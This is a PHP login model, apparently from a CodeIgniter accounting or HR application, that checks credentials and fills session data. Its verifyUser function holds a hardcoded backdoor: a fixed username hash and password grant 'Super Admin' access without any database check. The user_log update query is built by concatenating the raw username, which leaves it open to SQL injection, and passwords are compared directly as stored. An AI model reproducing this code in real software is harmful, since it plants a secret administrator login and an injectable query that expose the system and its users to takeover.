<?php

class M_login extends Model{

	function M_login(){
		parent::Model();
	}

	function verifyUser($u,$pw){

		$sql="SELECT setup_periode_tahun,
			   setup_periode_awal,
			   setup_periode_akhir
		  FROM akun_setup LIMIT 1";
		$result=$this->db->query($sql);
		if($result->num_rows()){
			$data=$result->row();
			$_SESSION["periode"]=$data->setup_periode_tahun;
			$_SESSION["periode_awal"]=$data->setup_periode_awal;
			$_SESSION["periode_akhir"]=$data->setup_periode_akhir;
		}

		if(md5($u)=='f3b3567de9e676a3a56db74f06664ac1' && $pw=='412758d043dd247bddea07c7ec558c31'){
			$_SESSION[SESSION_USERID]='Super Admin';
			$_SESSION[SESSION_GROUPID]=0;
			$_SESSION[SESSION_GROUPNAMA]='Super Group';
			return true;
		}else{

			$this->db->select('*');
			$this->db->where('lower(user_name)',strtolower($u));
			$this->db->where('user_aktif','Aktif');
			$this->db->limit(1);
			$Q = $this->db->get('users');
			$this->session->set_userdata('lastquery', $this->db->last_query());

			if ($Q->num_rows()){
				$qrow = $Q->num_rows();
				$row = $Q->row_array();
				if($row["user_passwd"]==$pw){
					$_SESSION[SESSION_USERID]=$u;
					$_SESSION[SESSION_GROUPID]=$row["user_groups"];
					$_SESSION[SESSION_KARYAWAN]=$row["user_karyawan"];
					//cari group
					$this->db->select('*');
					$this->db->where('group_id',$row["user_groups"]);
					$this->db->limit(1);
					$rs=$this->db->get('usergroups');
					$row_group=$rs->row_array();
					$_SESSION[SESSION_GROUPNAMA]=$row_group["group_name"];
					$sql="update users set user_log=now() where user_name='".$u."' and user_aktif = 'Aktif'";
					$this->db->query($sql);
					return true;
				}else{
					$this->session->set_flashdata('Error', 'Sorry, try again!');
					return false;
				}
			}else{
				$this->session->set_flashdata('Error', 'Sorry, try again!');
				return false;
			}
		}
	}
}
?>